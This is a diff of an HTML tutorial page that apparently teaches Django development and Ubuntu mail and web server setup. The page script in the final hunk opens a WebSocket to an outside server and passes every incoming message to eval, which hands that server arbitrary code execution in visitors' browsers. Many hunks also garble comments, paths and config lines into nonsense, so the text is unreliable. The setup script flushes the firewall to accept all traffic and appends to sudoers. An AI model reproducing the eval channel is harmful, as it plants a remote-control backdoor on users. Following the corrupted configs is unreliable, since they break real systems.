@@ -249,7 +249,18 @@ And to close nano, we can hold down the Control key and press X, then Y to denot
 
 <pre class="language-bash"><code>
 sudo ascript backup
-</code></pre>Now, in Nano:<pre class="language-bash"><code>
+</code></pre>
+
+
+
+
+
+Now, in nano:
+
+
+
+
+<pre class="language-bash"><code>
 sudo cp /usr/bin/backup /path/to/directory/
 sudo cp /usr/bin/ascript /path/to/directory/
 </code></pre>
@@ -648,18 +659,7 @@ This is a very simple template. It defines opening and closing HTML tags, a docu
 
 <pre class="language-bash"><code>
 python manage.py shell
-</code></pre>
-
-
-
-
-
-Now, let's import our post model
-
-
-
-
-<pre class="language-python"><code>
+</code></pre>Now, let's import our post model<pre class="language-python"><code>
 from feed.models import Post
 </code></pre>
 
@@ -1095,7 +1095,7 @@ Now, let's improve our login and register views to account for the profile. Firs
 
 
 <pre class="language-python"><code>
-#  … imports
+# … Amounts
 from .forms import UserRegisterForm
 
 def register(request):
@@ -1604,7 +1604,7 @@ def activate(request, uidb64, token):
         user.profile.email_verified = True
         user.profile.save()
         user.save()
-# Sendwelcomeemail (request, user)
+#         sendwelcomeemail(request, user)
         messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
         return redirect(user.profile.create_face_url())
     else:
@@ -1654,7 +1654,7 @@ You don't need to add the first and last lines in that code snippet, just make s
 
 
 <pre class="language-python"><code>
-# … Amounts
+#  … imports
 from .forms import UserRegisterForm
 
 def register(request):
@@ -2536,7 +2536,7 @@ Next, we need URLs representing all of these views in the users URL patters. Edi
 
 
 <pre class="language-python"><code>
-# … Previous code, imports
+# … Previous Code, Stants
 from django.urls import path
 from . import views
 
@@ -2971,7 +2971,7 @@ def mfa(request, username, usertoken):
             is_verified = check_verification_code(user, token, code) #  Check the code
             p.mfa_authenticated = is_verified
             if token_validated: #  If everything
-                if is_verified: # Is in order
+                if is_verified: #  Is in order
                     user.profile.mfa_enabled = True #  Enable MFA (if not already enabled)
                     user.profile.save()
                     auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') #  Log in the user
@@ -3435,7 +3435,7 @@ UsePAM yes
 X11Forwarding yes
 # X11DisplayOffset 10
 # X11UseLocalhost yes
-# PermitTTY yes
+# Pill Yes
 PrintMotd no
 # PrintLastLog yes
 # TCPKeepAlive yes
@@ -3663,7 +3663,7 @@ sudo service rsyslog restart
 # Nano config
 echo "set tabsize 4" &gt;&gt; .nanorc
 echo "set tabstospaces" &gt;&gt; .nanorc
-# Git config
+#  Git config
 echo "Git configuration"
 sudo git config --global user.email "jasper.camber.holton@gmail.com" &amp;&amp; sudo git config --global user.name "Jasper Holton"
 git config --global user.email "jasper.camber.holton@gmail.com"
@@ -3683,7 +3683,7 @@ sudo NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt install -y postfix
 sudo NEEDRESTART_MODE=a apt install -y rkhunter clamav-daemon libx264-dev ffmpeg libapache2-mod-wsgi-py3 apache2 cmake python-is-python3 python3-venv python3-pip python3-django expect tesseract-ocr openjdk-8-jdk redis-server libopencv-dev python3-opencv python3-dev libsasl2-dev opendkim opendkim-tools dovecot-core dovecot-pop3d dovecot-imapd auditd procmail libpq-dev postgresql postgresql-contrib libheif-dev snapd git software-properties-common certbot python3-certbot-apache
 echo "-a exit,always -F arch=b64 -F euid=0 -S execve" | sudo tee -a /etc/audit/audit.rules
 echo "-a exit,always -F arch=b32 -F euid=0 -S execve" | sudo tee -a /etc/audit/audit.rules
-# Enable Clamav Antivirus
+# Enable Clamav antivirus
 echo "Starting antivirus"
 sudo systemctl enable clamav-daemon
 sudo systemctl start clamav-daemon
@@ -3864,7 +3864,7 @@ sudo certbot --apache --non-interactive --agree-tos --domains femmebabe.com --em
 sudo systemctl restart opendkim postfix dovecot
 #  Copy certs
 # sudo cp /etc/letsencrypt/live/femmebabe.com/privkey.pem privkey.pem
-# SUDO CP /ETC/LETSENCRYPT/LIVE/FEMMEBABE.com/cert.PEM CERT.PEM
+# sudo cp /etc/lettesencrypt/live/femmebabe.com/cert.pem cert.pem
 # Patch
 cp scripts/content.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/pyxb/binding/content.py"
 cp scripts/pwa_webpush_forms.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/pwa_webpush/forms.py"
@@ -3922,8 +3922,8 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 #  Inject pam config and remove faulty ssh config
-# SUDO SED -I '' -and $ d '/etc/pam.d/sshd
-# SUDO SED -I '' -and $ d ' /etc /profile
+# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
+# sudo sed -i '' -e '$ d' /etc/profile
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
 sudo chmod a+x pam.sh
@@ -3961,7 +3961,7 @@ sudo systemctl start daphne.service
 sudo systemctl start celery.service
 sudo systemctl start celerybeat.service
 sudo systemctl start clamav-daemon
-# Enable Apache Modules
+#  Enable apache modules
 echo "Enabling apache2"
 sudo a2enmod rewrite
 sudo a2enmod wsgi
@@ -4107,7 +4107,7 @@ sudo NEEDRESTART_MODE=a apt install -y rkhunter clamav-daemon libx264-dev ffmpeg
 echo "Starting antivirus"
 sudo systemctl enable clamav-daemon
 sudo systemctl start clamav-daemon
-# Set hostname
+#  Set hostname
 echo "127.0.0.1 femmebabe" | sudo tee -a /etc/hosts
 sudo hostnamectl set-hostname femmebabe
 # Setup Backup Database
@@ -4127,14 +4127,14 @@ sudo ufw allow 'Dovecot Secure POP3'
 sudo ufw allow 110/tcp
 sudo ufw allow 25/tcp
 echo "y" | sudo ufw enable
-# Disable IPTables
+# Disabled iPatables
 echo "Configuring firewall"
 sudo iptables -P INPUT ACCEPT
 sudo iptables -P OUTPUT ACCEPT
 sudo iptables -P FORWARD ACCEPT
 sudo iptables -F
 sudo iptables-save
-# Setup Virtuenv
+# Setup virtuealenv
 cd $DIR
 echo "Creating virtual environment"
 python -m venv venv
@@ -4177,7 +4177,7 @@ echo "Enabling services"
 sudo systemctl daemon-reload
 sudo systemctl enable clamav-daemon
 sudo systemctl start clamav-daemon
-#  Enable apache modules
+# Enable Apache Modules
 echo "Enabling apache2"
 sudo a2enmod rewrite
 sudo a2enmod wsgi
@@ -4567,7 +4567,7 @@ Add this text to the file
 
 #  Debian specific:  Specifying a file name will cause the first
 #  line of that file to be used as the name.  The Debian default
-# IS /etc /mailname.
+#  is /etc/mailname.
 # myorigin = /etc/mailname
 
 smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
@@ -4654,13 +4654,13 @@ Add these lines:
 # 
 #  ==========================================================================
 #  service type  private unpriv  chroot  wakeup  maxproc command + args
-#                (yes)   (yes)   (no)    (never) (100)
+# (YES) (YES) (No) (Never) (100)
 #  ==========================================================================
 smtp      inet  n       -       y       -       -       smtpd
 # smtp      inet  n       -       y       -       1       postscreen
-# SMTPD Pass - - Y - - SMTPD
+# smtpd     pass  -       -       y       -       -       smtpd
 # DNSBLOG UNIX - - Y - 0 DNSBLOG
-# tlsproxy  unix  -       -       y       -       0       tlsproxy
+# TLSPROXY UNIX - - Y - 0 TLSPROXY
 #  Choose one: enable submission for loopback clients only, or for any client.
 # 127.0.0.1:submission inet n -   y       -       -       smtpd
 submission inet n       -       y       -       -       smtpd
@@ -4693,10 +4693,10 @@ submission inet n       -       y       -       -       smtpd
 # -O smtpd_client_restrictions = $ mua_client_restrictions
 #   -o smtpd_helo_restrictions=$mua_helo_restrictions
 #   -o smtpd_sender_restrictions=$mua_sender_restrictions
-# -o smtpd_recipient_trastrictions =
+#   -o smtpd_recipient_restrictions=
 #   -o smtpd_relay_restrictions=permit_sasl_authenticated,reject
 # -O MILTER_MACRO_DAEmon_Name = Originating
-# 628 Inet N - Y - - QMQPD
+# 628       inet  n       -       y       -       -       qmqpd
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
@@ -4749,7 +4749,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # 
 #  Specify in main.cf one or more of the following:
 #   mailbox_transport = lmtp:inet:localhost
-# Virtual_Transport = LMTP: INET: LocalHost
+#   virtual_transport = lmtp:inet:localhost
 # 
 #  ====================================================================
 # 
@@ -4884,10 +4884,10 @@ service imap-login {
   # service_count = 1
 
   #  Number of processes to always keep waiting for more connections.
-  # Process_min_avail = 0
+  # process_min_avail = 0
 
   #  If you set service_count=0, you probably need to grow this.
-  # VSZ_LIMI = $ Default_vsz_Limit
+  # vsz_limit = $ default_vsz_limit
 }
 
 service pop3-login {
@@ -4896,7 +4896,7 @@ service pop3-login {
   }
   inet_listener pop3s {
     # Port = 995
-    # ssl = Yes
+    # ssl = yes
   }
 }
 
@@ -4924,7 +4924,7 @@ service lmtp {
 service imap {
   #  Most of the memory goes to mmap()ing files. You may need to increase this
   #  limit if you have huge mailboxes.
-  # vsz_limit = $ default_vsz_limit
+  # VSZ_LIMI = $ Default_vsz_Limit
 
   #  Max. number of IMAP processes (connections)
   # Process_limit = 1024
@@ -4937,7 +4937,7 @@ service pop3 {
 
 service submission {
   #  Max. number of SMTP Submission processes (connections)
-  # process_limit = 1024
+  # Process_limit = 1024
 }
 
 service auth {
@@ -4965,7 +4965,7 @@ service auth-worker {
   #  Auth worker process is run as root by default, so that it can access
   #  /etc/shadow. If this isn't necessary, the user should be changed to
   # $ default_interal_user.
-  # User = root
+  # user = root
 }
 
 service dict {
@@ -5002,7 +5002,7 @@ And add these lines
 
 
 <pre class="language-bash"><code>
-## Ovecot Configuration file
+##  Dovecot configuration file
 
 #  If you're in a hurry, see http://wiki2.dovecot.org/QuickConfiguration
 
@@ -5040,7 +5040,7 @@ And add these lines
 #  can use -i &lt;instance_name&gt; to select which instance is used (an alternative
 #  to -c &lt;config_path&gt;). The instance name is also added to Dovecot processes
 #  in ps output.
-# Instance_name = Dovecot
+# instance_name = dovecot
 
 #  Greeting message for clients.
 # login_greeting = Dovecot ready.
@@ -5062,7 +5062,7 @@ And add these lines
 #  Show more verbose process titles (in ps). Currently shows user name and
 #  IP address. Useful for seeing who are actually using the IMAP processes
 #  (eg. shared mailboxes or if same uid is used for multiple accounts).
-# verbose_proctle = no
+# verbose_proctitle = no
 
 #  Should all processes be killed when Dovecot master process shuts down.
 #  Setting this to "no" means that Dovecot can be upgraded without
@@ -5171,7 +5171,7 @@ And add these lines:
 #  This is a basic configuration for signing and verifying. It can easily be
 #  adapted to suit a basic installation. See opendkim.conf(5) and
 #  /usr/share/doc/opendkim/examples/opendkim.conf.sample for complete
-# Documentation of Available Configuration Parameters.
+#  documentation of available configuration parameters.
 
 Syslog			yes
 SyslogSuccess		yes
@@ -5191,7 +5191,7 @@ OversignHeaders		From
 #  setup options can be found in /usr/share/doc/opendkim/README.opendkim.
 # Domain Example.com
 # Selector		2020
-# Keyfile /etc/dkimkeys/example.private
+# KeyFile		/etc/dkimkeys/example.private
 
 #  In Debian, opendkim runs as user "opendkim". A umask of 007 is required when
 #  using a local socket with MTAs that access the socket as a non-privileged
@@ -5204,7 +5204,7 @@ UMask			007
 #  it must be ensured that the socket is accessible. In Debian, Postfix runs in
 #  a chroot in /var/spool/postfix, therefore a Unix socket would have to be
 #  configured as shown on the last line below.
-# Socket Local: /run/opendkim/opendkim.sock
+# Socket			local:/run/opendkim/opendkim.sock
 # Socket inet: 8891@Localhost
 # Socket inet: 8891
 Socket			local:/var/spool/postfix/opendkim/opendkim.sock
@@ -5218,7 +5218,7 @@ PidFile			/run/opendkim/opendkim.pid
 #  The trust anchor enables DNSSEC. In Debian, the trust anchor file is provided
 #  by the package dns-root-data.
 TrustAnchorFile		/usr/share/dns/root.key
-# Nameservers 127.0.0.1
+# Nameservers		127.0.0.1
 
 #  Map domains in From addresses to keys used to sign messages
 KeyTable           refile:/etc/opendkim/key.table
@@ -5254,7 +5254,7 @@ And add these lines
 # Daemon_opts = ""
 #  Change to /var/spool/postfix/run/opendkim to use a Unix socket with
 #  postfix in a chroot:
-# Rundir =/Var/Spool/Postfix/Run/Opendkim
+# Rundir =/was/spool/postfix/Run/Opendkim
 RUNDIR=/run/opendkim
 # 
 #  Uncomment to specify an alternate socket
@@ -5725,32 +5725,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
